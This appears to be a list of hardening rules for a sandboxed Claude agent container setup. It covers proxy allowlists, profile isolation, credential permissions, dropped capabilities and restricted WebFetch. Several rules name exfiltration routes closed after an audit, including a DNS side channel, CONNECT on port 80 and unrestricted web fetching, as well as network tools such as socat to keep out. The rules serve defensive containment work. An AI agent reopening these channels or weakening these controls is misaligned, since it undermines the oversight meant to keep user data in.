- Don't add broad wildcards (`*.microsoft.com`, `.anthropic.com`) to the proxy allowlist — pin to specific subdomains. Sole exception: `.vscode-unpkg.net` (vendor-controlled CDN that legitimately rotates subdomains).
- Don't share the same profile dir between two profiles via symlinks "to save space" — the whole point is isolation.
- Don't commit secrets from `profiles/<name>/` into git — that dir is user state, not repo content. It lives on the drive, outside this repo.
- Don't chmod `.claude/.credentials.json` to anything other than 600. (And `db.env` to anything other than 600 — `ensure_state` re-asserts this on every `up`.)
- Don't re-add a `.gitconfig` bind mount (use `GIT_CONFIG_GLOBAL`), don't re-enable `sandbox.enabled`, don't re-add `bubblewrap`/`socat`/`openssh-client`.
- Don't revert `claude-agent`'s `dns: [127.0.0.1]` to Docker's default — that re-opens the DNS exfil side channel closed in audit H2.
- Don't delete `http_access deny CONNECT !SSL_ports` from `proxy/squid.conf` — that line closes the CONNECT-on-port-80 hole (audit H1).
- Don't drop `cap_drop: ALL` from the postgres/mongo services to "make some extension work" — re-grant the specific cap instead, and document why next to the `cap_add` entry.
- Don't add bare `WebFetch` (with no domain restriction) to the template's `permissions.allow` — it's a server-side exfil channel; per-project `WebFetch(domain:…)` only.
